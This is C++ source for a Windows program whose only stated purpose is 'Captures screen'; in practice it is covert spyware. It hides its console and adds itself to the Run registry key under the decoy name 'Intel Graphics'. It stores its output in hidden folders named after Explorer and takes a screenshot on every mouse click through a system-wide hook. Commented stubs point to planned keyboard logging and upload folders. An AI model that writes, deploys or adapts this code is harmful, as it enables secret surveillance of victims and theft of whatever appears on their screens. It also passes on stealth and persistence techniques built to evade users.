/*****************************************************************************/
/*****************************************************************************/
/* ABOUT */

/* Captures screen. */

/*****************************************************************************/
/*****************************************************************************/
/* PRAGMAS, DEFINITIONS AND HEADER FILES */

/*****************************************************************************/
#pragma once

/*****************************************************************************/

/*
 * Definition for blocking "safe code" warnings!
 * This function or variable may be unsafe. Consider using xxxxxx instead.
 * To disable deprecation, use _CRT_SECURE_NO_WARNINGS. See online help for
 * details.
 */

#ifdef _MSC_VER
#define _CRT_SECURE_NO_WARNINGS
#endif // _MSC_VER

/*****************************************************************************/

/* Exclude rarely-used stuff from Windows headers. */

#define WIN32_LEAN_AND_MEAN

/*
 * If you need Win32 API features newer the Win95 and WinNT, then you must
 * define WINVER before including windows.h or any other method of including
 * the windef.h header.
 */

/* Next two lines are same! */
//#define _WIN32_WINNT 0x0500
#define WINVER 0x0500 /* Code works on Win(2k and successors) */

/*****************************************************************************/

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <shlobj_core.h>
#include <iostream>
#include <ctime>
#include <gdiplus.h>

/* If pragma below was not written, GDIPlus throws too many errors. */
#pragma comment (lib, "gdiplus.lib")

/*****************************************************************************/
/* CONSTANT DEFINITIONS */

/* LOCALAPPDATA */
/*****************************************************************************/
//#define CLN_EXE "cleanmgr.exe"

/* LOCALAPPDATA > EXPLORER */
/*****************************************************************************/
#define MAIN_DIR "Explorer"

/* LOCALAPPDATA > EXPLORER > SRC */
/*****************************************************************************/
#define SRC_DIR "src"

/* LOCALAPPDATA > EXPLORER > REC */
/*****************************************************************************/
#define REC_DIR "rec"
//#define AUD_DIR "audio"
//#define DOC_DIR "document"
//#define IMG_DIR "image"
#define KEY_DIR "keyboard"
#define SCR_DIR "screen"
//#define VID_DIR "video"
#define QKLOG_FILE "q_keyboard.lnk"
#define FKLOG_FILE "f_keyboard.lnk"

/* LOCALAPPDATA > EXPLORER > POST */
/*****************************************************************************/
//#define POST_DIR "post"
//#define POST_IN "in"
//#define POST_OUT "out"

/* LOCALAPPDATA > EXPLORER */
/*****************************************************************************/
//#define CPH_EXE "cipher.exe"
#define GFX_EXE "GfxUI.exe"
#define CPY_EXE "robocopy.exe"
#define EXP_EXE "explorer.exe"
//#define MGR_EXE "taskmgr.exe"
//#define TSC_EXE "mstsc.exe"
//#define VER_INI "v0.0.2.ini" // check before packing!

/*****************************************************************************/
/* C++ NAMESPACES */

using namespace std;
using namespace Gdiplus;

/*****************************************************************************/
/*****************************************************************************/
/* FUNCTION PROTOTYPES */

int fnAllFileStreamsCloser(void);
int fnCaptureScreen(void);
int fnDirBuilder(void);
//__declspec(dllexport) // for LRESULT WINAPI fnMouseCallback
LRESULT WINAPI fnMouseCallback(int nCode, WPARAM wParam, LPARAM lParam);
DWORD WINAPI fnMouseHook(LPVOID lpParameter);
int fnMouseThreadInit(char* argv[]);
int fnRegistryAdd(void);
//int fnRegistryDelete(void);
int fnStealthConsole(void);

/*****************************************************************************/
/*****************************************************************************/
/* GLOBAL VARIABLES */

/* VISIBLE = 0, logger hidden. VISIBLE = 1, logger is visible. */
const int VISIBLE = 0;
 
HHOOK hKeyHook; /* Global hook handle. */

/*****************************************************************************/
/*****************************************************************************/

int fnAllFileStreamsCloser(void)
{
    _fcloseall();

    return 0;
}

/*****************************************************************************/
/*****************************************************************************/

int fnCaptureScreen(void)
{
    /*************************************************************************/
    char szCapturedImagePath[MAX_PATH] = {""};

    /*************************************************************************/
    /* Gets date and time. */
    char szDateTime[20];
    time_t tRawTime;
    struct tm STimeInfo;
    time(&tRawTime);
    localtime_s(&STimeInfo, &tRawTime);
    strftime(szDateTime, 20, "%Y%m%d%H%M%S", &STimeInfo);

    /*************************************************************************/
    /* Sets image saving path in LOCALAPPDATA path. */
    char* chpLocalAppdataPath = getenv("LOCALAPPDATA");
    strcat(szCapturedImagePath, chpLocalAppdataPath);
    strcat(szCapturedImagePath, "\\Explorer\\rec\\screen\\");
    strcat(szCapturedImagePath, szDateTime);
    strcat(szCapturedImagePath, ".jpg");

    /*************************************************************************/
    /* Converts char array to string. */
    std::string strConvertedJpg = szCapturedImagePath;

    /*************************************************************************/
    /* GDI */
    ULONG_PTR gdiplustoken;
    GdiplusStartupInput gdistartupinput;
    GdiplusStartupOutput gdistartupoutput;

    gdistartupinput.SuppressBackgroundThread = true;
    GdiplusStartup(&gdiplustoken, &gdistartupinput,
        &gdistartupoutput); /* Start GDI+ */

    HWND hwnd = GetDesktopWindow();
    HDC hdc = GetDC(hwnd); /* Get desktop content. */

    /* Get a DC compat. w/ the screen. */
    HDC hdcMem = CreateCompatibleDC(hdc); /* Copy context.*/

    //HDC hdc = GetDC(GetDesktopWindow()); /* Get desktop content. */
    ///* Get a DC compat. w/ the screen. */
    //HDC hdcMem = CreateCompatibleDC(hdc);    //copy context

    /*************************************************************************/
    /* Gets screen resolution. */
    RECT rectDesktop;

    GetClientRect(GetDesktopWindow(), &rectDesktop); /* Get desktop size. */
    int nWidth = rectDesktop.right - rectDesktop.left; /* Width */
    int nHeight = rectDesktop.bottom - rectDesktop.top; /* Height */

    /* Make a bmp in memory to store the capture in */
    /* Create bitmap. */
    HBITMAP hbitmap = CreateCompatibleBitmap(hdc, nWidth, nHeight);
    /* Join em up. */
    HBITMAP holdbitmap = (HBITMAP)SelectObject(hdcMem, hbitmap);

    /* Copy pixel from the screen to bitmap. */
    BitBlt(hdcMem, 0, 0, nWidth, nHeight, hdc, 0, 0, SRCCOPY);

    /*************************************************************************/
    /* Gets and combines cursor on captured image. */
    CURSORINFO cursor = {sizeof(cursor)};
    GetCursorInfo(&cursor);

    if(cursor.flags == CURSOR_SHOWING)
    {
        RECT rect;
        GetWindowRect(hwnd, &rect);
        ICONINFO info = {sizeof(info)};
        GetIconInfo(cursor.hCursor, &info);

        //const int x = cursor.ptScreenPos.x - rect.left - rect.left - info.xHotspot;
        //const int y = cursor.ptScreenPos.y - rect.top - rect.top - info.yHotspot;

        int x = cursor.ptScreenPos.x - rect.left - rect.left - info.xHotspot;
        int y = cursor.ptScreenPos.y - rect.top - rect.top - info.yHotspot;

        BITMAP bmpCursor = {0};
        GetObject(info.hbmColor, sizeof(bmpCursor), &bmpCursor);
        DrawIconEx(hdcMem, x, y, cursor.hCursor, bmpCursor.bmWidth,
            bmpCursor.bmHeight, 0, NULL, DI_NORMAL);
    }

    Bitmap* pBitmap = new Bitmap(hbitmap, NULL);

    /*************************************************************************/
    /* Encodes image. */
    UINT uiNum;
    UINT uiSize;

    ImageCodecInfo *pImageCodecInfo;
    GetImageEncodersSize(&uiNum, &uiSize); /* Get count of codec. */

    pImageCodecInfo = (ImageCodecInfo*)(malloc(uiSize));
    GetImageEncoders(uiNum, uiSize, pImageCodecInfo); /* Get codec. */

    CLSID clsidEncoder;
    UINT i;
    for(i = 0; i < uiNum; i++)
    {
        if(wcscmp(pImageCodecInfo[i].MimeType, L"image/jpeg") == 0)
            clsidEncoder = pImageCodecInfo[i].Clsid;/* Get jpeg codec id. */
    }

    /*************************************************************************/
    /* Frees memory! */
    free(pImageCodecInfo);

    /*************************************************************************/
    /* Saves jpeg. */
    wstring wstr;
    /* string to wstring. */
    wstr.assign(strConvertedJpg.begin(), strConvertedJpg.end());
    pBitmap->Save(wstr.c_str(), &clsidEncoder); /* Save in jpeg format. */

    /*************************************************************************/
    /* Frees memory! */
    SelectObject(hdcMem, holdbitmap); /* Release Objects. */
    DeleteObject(hdcMem);
    DeleteObject(hbitmap);
    ReleaseDC(GetDesktopWindow(), hdc);
    GdiplusShutdown(gdiplustoken);

    return 0;
}

/*****************************************************************************/
/*****************************************************************************/

int fnDirBuilder(void)
{
    char* chpLocalAppdataPath = getenv("LOCALAPPDATA");

    char szSysMainPath[MAX_PATH] = {""};
    strcat(szSysMainPath, chpLocalAppdataPath);
    strcat(szSysMainPath, "\\");
    strcat(szSysMainPath, MAIN_DIR);

    /* fileapi.h (include Windows.h) */
    if(CreateDirectoryA(szSysMainPath, NULL))
    {
        SetFileAttributesA(szSysMainPath, FILE_ATTRIBUTE_HIDDEN); /* Hidden. */

        /* Makes 'Explorer > src' directory. ('Explorer' subdir.) */
        char szSysSrcPath[MAX_PATH] = {""};
        strcat(szSysSrcPath, szSysMainPath);
        strcat(szSysSrcPath, "\\");
        strcat(szSysSrcPath, SRC_DIR);
        CreateDirectoryA(szSysSrcPath, NULL);
        SetFileAttributesA(szSysSrcPath, FILE_ATTRIBUTE_HIDDEN); /* Hidden. */


        /* Makes 'Explorer > rec' directory. ('Explorer' subdir.) */
        char szSysRecPath[MAX_PATH] = {""};
        strcat(szSysRecPath, szSysMainPath);
        strcat(szSysRecPath, "\\");
        strcat(szSysRecPath, REC_DIR);
        CreateDirectoryA(szSysRecPath, NULL);
        SetFileAttributesA(szSysRecPath, FILE_ATTRIBUTE_HIDDEN); /* Hidden. */


        ///* Makes 'rec > audio' directory. ('rec' subdir.) */
        //char szSysAudRecPath[MAX_PATH] = {""};
        //strcat(szSysAudRecPath, szSysRecPath);
        //strcat(szSysAudRecPath, "\\");
        //strcat(szSysAudRecPath, AUD_DIR);
        //CreateDirectoryA(szSysAudRecPath, NULL);
        //SetFileAttributesA(szSysAudRecPath, FILE_ATTRIBUTE_HIDDEN); /* Hidden. */


        ///* Makes 'rec > document' directory. ('rec' subdir.) */
        //char szSysDocRecPath[MAX_PATH] = {""};
        //strcat(szSysDocRecPath, szSysRecPath);
        //strcat(szSysDocRecPath, "\\");
        //strcat(szSysDocRecPath, DOC_DIR);
        //CreateDirectoryA(szSysDocRecPath, NULL);
        //SetFileAttributesA(szSysDocRecPath, FILE_ATTRIBUTE_HIDDEN); /* Hidden. */


        ///* Makes 'rec > image' directory. ('rec' subdir.) */
        //char szSysImgRecPath[MAX_PATH] = {""};
        //strcat(szSysImgRecPath, szSysRecPath);
        //strcat(szSysImgRecPath, "\\");
        //strcat(szSysImgRecPath, IMG_DIR);
        //CreateDirectoryA(szSysImgRecPath, NULL);
        //SetFileAttributesA(szSysImgRecPath, FILE_ATTRIBUTE_HIDDEN); /* Hidden. */


        /* Makes 'rec > keyboard' directory. ('rec' subdir.) */
        char szSysKeyRecPath[MAX_PATH] = {""};
        strcat(szSysKeyRecPath, szSysRecPath);
        strcat(szSysKeyRecPath, "\\");
        strcat(szSysKeyRecPath, KEY_DIR);
        CreateDirectoryA(szSysKeyRecPath, NULL);
        SetFileAttributesA(szSysKeyRecPath, FILE_ATTRIBUTE_HIDDEN); /* Hidden. */


        /* Makes 'rec > screen' directory. ('rec' subdir.) */
        char szSysScrRecPath[MAX_PATH] = {""};
        strcat(szSysScrRecPath, szSysRecPath);
        strcat(szSysScrRecPath, "\\");
        strcat(szSysScrRecPath, SCR_DIR);
        CreateDirectoryA(szSysScrRecPath, NULL);
        SetFileAttributesA(szSysScrRecPath, FILE_ATTRIBUTE_HIDDEN); /* Hidden. */


        ///* Makes 'rec > video' directory. ('rec' subdir.) */
        //char szSysVidRecPath[MAX_PATH] = {""};
        //strcat(szSysVidRecPath, szSysRecPath);
        //strcat(szSysVidRecPath, "\\");
        //strcat(szSysVidRecPath, VID_DIR);
        //CreateDirectoryA(szSysVidRecPath, NULL);
        //SetFileAttributesA(szSysVidRecPath, FILE_ATTRIBUTE_HIDDEN); /* Hidden. */


        ///* Makes 'Explorer > post' directory. ('Explorer' subdir.) */
        //char szSysPostPath[MAX_PATH] = {""};
        //strcat(szSysPostPath, szSysMainPath);
        //strcat(szSysPostPath, "\\");
        //strcat(szSysPostPath, POST_DIR);
        //CreateDirectoryA(szSysPostPath, NULL);
        //SetFileAttributesA(szSysPostPath, FILE_ATTRIBUTE_HIDDEN); /* Hidden. */


        ///* Makes 'post > in' directory. ('post' subdir.) */
        //char szSysPostInPath[MAX_PATH] = {""};
        //strcat(szSysPostInPath, szSysPostPath);
        //strcat(szSysPostInPath, "\\");
        //strcat(szSysPostInPath, POST_IN);
        //CreateDirectoryA(szSysPostInPath, NULL);
        //SetFileAttributesA(szSysPostInPath, FILE_ATTRIBUTE_HIDDEN); /* Hidden. */


        ///* Makes 'post > out' directory. ('post' subdir.) */
        //char szSysPostOutPath[MAX_PATH] = {""};
        //strcat(szSysPostOutPath, szSysPostPath);
        //strcat(szSysPostOutPath, "\\");
        //strcat(szSysPostOutPath, POST_OUT);
        //CreateDirectoryA(szSysPostOutPath, NULL);
        //SetFileAttributesA(szSysPostOutPath, FILE_ATTRIBUTE_HIDDEN); /* Hidden. */
    }

    return 0;
}

/*****************************************************************************/
/*****************************************************************************/

LRESULT WINAPI fnMouseCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    /* WH_MOUSE_LL struct. */
    MSLLHOOKSTRUCT *pMouseStruct = (MSLLHOOKSTRUCT *)lParam;

/*
 * nCode, this parameters will determine how to process a message
 * This callback in this case only have information when it is 0 (HC_ACTION):
 *  wParam and lParam contain info
 * 
 * wParam is about WINDOWS MESSAGE, in this case MOUSE messages.
 * lParam is information contained in the structure MSLLHOOKSTRUCT
 */

    /* We have information in wParam/lParam ? If yes, let's check it. */
    if(nCode == 0)
    {
        //if(pMouseStruct != NULL) /* Is mouse struct contains information? */
        //{
        //    printf("Mouse Coordinates: x = %li | y = %li \n",
        //        pMouseStruct->pt.x, pMouseStruct->pt.y);
        //}

        switch(wParam)
        {
        case WM_RBUTTONDOWN:
        {
            fnCaptureScreen();
        }
        break;
        case WM_MBUTTONDOWN:
        {
            fnCaptureScreen();
        }
        break;
        case WM_LBUTTONDOWN:
        {
            //printf("LEFT CLICK DOWN\n");

            fnCaptureScreen();
        }
        break;
        }
    }

    /*
     * Every time that the nCode is less than 0 we need to CallNextHookEx:
     * -> Pass to the next hook
     * MSDN: Calling CallNextHookEx is optional, but it is highly recommended;
     * otherwise, other applications that have installed hooks will not receive
     * hook notifications and may behave incorrectly as a result.
     */

    //return CallNextHookEx(CMouseHook::Instance().hHook, nCode, wParam, lParam);
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

/*****************************************************************************/
/*****************************************************************************/
/* Function called by mouse thread init function to install hook. */

DWORD WINAPI fnMouseHook(LPVOID lpParameter)
{
    HHOOK hMouseHook;
    /*
     * Retrieves a module handle for the specified module.
     * 
     * Parameter is NULL, GetModuleHandle returns a handle to the file used to
     * create the calling process (.exe file).
     * 
     * If the function succeeds,
     * the return value is a handle to the specified module.
     * 
     * If the function fails, the return value is NULL.
     */
    HINSTANCE hExe = GetModuleHandle(NULL);
    if(hExe == NULL)
    {
        return 1;
    }
    else
    {
        /*
         * Installs an application-defined hook procedure into a hook chain.
         *
         * 1st Parameter idHook: WH_MOUSE_LL
         * The type of hook procedure to be installed.
         * Installs a hook procedure that monitors low-level
         * mouse input events.
         *
         * 2nd Parameter lpfn: fnMouseCallback
         * A pointer to the hook procedure.
         *
         * 3rd Parameter hMod: hExe
         * A handle to the DLL containing the hook procedure pointed to by the
         * lpfn parameter.
         *
         * 4th Parameter dwThreadId: 0
         * The hook procedure is associated with all existing threads running.
         * 
         * If the function succeeds, the return value is the handle to the
         * hook procedure.
         * 
         * If the function fails, the return value is NULL.
         */

        hMouseHook = SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)fnMouseCallback, hExe, 0);
        
        /*
         * Defines a system-wide hot key of alt+ctrl+9
         * 
         * 1st Parameter hWnd(optional): NULL
         * A handle to the window that will receive hot key message generated
         * by hot key.
         *
         * 2nd Parameter id:1
         * The identifier of the hot key
         *
         * 3rd Parameter fsModifiers: MOD_ALT | MOD_CONTROL
         * The keys that must be pressed in combination with the key
         * specified by the uVirtKey parameter in order to generate
         * the WM_HOTKEY message.
         * 
         * 4th Parameter vk: 0x39(9)
         * The virtual-key code of the hot key.
         */
        
         //RegisterHotKey(NULL, 1, MOD_ALT | MOD_CONTROL, 0x39);

        MSG msg;

        /*
         * Message loop retrieves messages from the thread's message queue and
         * dispatches them to the appropriate window procedures.
         * For more info:
         * http://msdn.microsoft.com/en-us/library/
         * ms644928%28v=VS.85%29.aspx#creating_loop
         * Retrieves a message from the calling thread's message queue.
         */

        while(GetMessage(&msg, NULL, 0, 0) != 0)
        {
            ///* If Hot key combination is pressed, then exit. */
            //if(msg.message == WM_HOTKEY)
            //{
            //    UnhookWindowsHookEx(hMouseHook);
            //    return 0;
            //}

            /* Translates virtual-key messages into character messages. */
            TranslateMessage(&msg);
            /* Dispatches a message to a window procedure. */
            DispatchMessage(&msg);

            //Sleep(5);
        }

        /*
         * To free system resources associated with the hook and
         * removes a hook procedure installed in a hook chain
         * Parameter hhk: hMouseHook - A handle to the hook to be removed.
         */

        UnhookWindowsHookEx(hMouseHook);
    }
    return 0;
}

/*****************************************************************************/
/*****************************************************************************/

int fnMouseThreadInit(char* argv[])
{
    HANDLE hMouseThread;
    /* DWORD dwThread; */

    /*
     * CreateThread function Creates a thread to execute within the virtual
     * address space of the calling process.
     *
     * 1st Parameter lpThreadAttributes:  NULL - Thread gets a default
     * security descriptor.
     *
     * 2nd Parameter dwStackSize:  0  - The new thread uses the default size
     * for the executable.
     *
     * 3rd Parameter lpStartAddress:  fnKeyboardHook - A pointer to the
     * application-defined function to be executed by the thread
     *
     * 4th Parameter lpParameter:  argv[0] -  A pointer to a variable
     * to be passed to the thread
     *
     * 5th Parameter dwCreationFlags: 0 - The thread runs immediately
     * after creation.
     *
     * 6th Parameter pThreadId(out parameter): NULL - the thread identifier is
     * not returned
     *
     * If the function succeeds, the return value is a handle to the new thread.
     */

    hMouseThread =
        CreateThread
        (
            NULL, 0, (LPTHREAD_START_ROUTINE)fnMouseHook,
            (LPVOID)argv[0], 0, NULL
        );


    if(hMouseThread)
    {
        /*
         * Waits until the specified object is in the signaled state or
         * the time-out interval elapses.
         */

        return WaitForSingleObject(hMouseThread, INFINITE);
    }

    /* If it is Null then exit the function. */

    else
    {
        return 1;
    }
}

/*****************************************************************************/
/*****************************************************************************/

int fnRegistryAdd(void) /* Autostart on system bootup! */
{
    /*************************************************************************/
    /* Gets localappdata path. */
    char* chpLocalAppdataPath = getenv("LOCALAPPDATA");

    /*************************************************************************/
    /* Assigns and stores GfxUI.exe path. */
    char szGfxuiExePath[MAX_PATH] = {""};

    strcat(szGfxuiExePath, chpLocalAppdataPath);

    strcat(szGfxuiExePath, "\\");
    strcat(szGfxuiExePath, MAIN_DIR);
    strcat(szGfxuiExePath, "\\");
    strcat(szGfxuiExePath, GFX_EXE);

    /*************************************************************************/
    /* Adds and edits registry. */

    HKEY hKey; /* Registry key handle. WinDef.h */

    /*
     * winreg.h (include Windows.h)
     * Opens the specified registry key.
     * Note that key names are not case sensitive!
     */

    RegOpenKeyExA(HKEY_CURRENT_USER,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey);

    /*
     * winreg.h (include Windows.h)
     * Sets the data and type of a specified value under a registry key.
     * "Intel Graphics" is the string value of our program.
     * It can be also like this: "Windows Atapi x86_64 Driver"
     */

    RegSetValueExA(hKey, "Intel Graphics", 0, REG_SZ,
        (const unsigned char *)szGfxuiExePath, MAX_PATH);

    /*
     * winreg.h (include Windows.h)
     * Closes handle to the specified registry key.
     */

    RegCloseKey(hKey);

    return 0;
}

/*****************************************************************************/
/*****************************************************************************/

//int fnRegistryDelete(void)
//{
//    /* Deletes registry. */
//
//    HKEY hkey = NULL; /* Registry key handle. WinDef.h */
//
//    /*
//     * winreg.h (include Windows.h)
//     * Opens the specified registry key.
//     * Note that key names are not case sensitive!
//     */
//
//    RegOpenKeyExA(HKEY_CURRENT_USER,
//        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
//        0, KEY_ALL_ACCESS, &hkey);
//
//    /*
//     * winreg.h (include Windows.h)
//     * Removes a named value from the specified registry key.
//     * Note that value names are not case sensitive.
//     */
//
//    RegDeleteValueW(hkey, TEXT("Intel Graphics"));
//
//    /*
//     * winreg.h (include Windows.h) 
//     * Closes handle to the specified registry key.
//     */
//
//    RegCloseKey(hkey);
//
//    return 0;
//}

/*****************************************************************************/
/*****************************************************************************/
/* Function to hide the fnScreenLogger terminal window. */

int fnStealthConsole(void)
{
    /*
     * Retrieves a handle to the top-level window whose class name and window
     * name match the specified strings.
     *
     * 1st Parmeter lpClassName: ConsoleWindowClass - Class Name
     * 2nd Parameter lpWindowName: parameter is NULL, all window names match.
     *
     * If the function succeeds, the return value is a handle to the window
     * that has the specified class name and window name.
     *
     * If the function fails, the return value is NULL.
     */

    HWND stealth; /* WinDef.h */

    AllocConsole(); /* ConsoleApi3.h(via Wincon.h, include Windows.h) */

    /* winuser.h (include Windows.h) */
    stealth = FindWindowA("ConsoleWindowClass", NULL);

    ShowWindow(stealth, 0); /* winuser.h (include Windows.h) */

    return 0;
}

/*****************************************************************************/
/*****************************************************************************/

int main(int argc, char** argv)
{
    if(VISIBLE == 0)
    {
        fnStealthConsole();
    }

    fnRegistryAdd();
    /*fnRegistryDelete();*/

    fnDirBuilder();

    fnMouseThreadInit(argv);

    return 0;
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
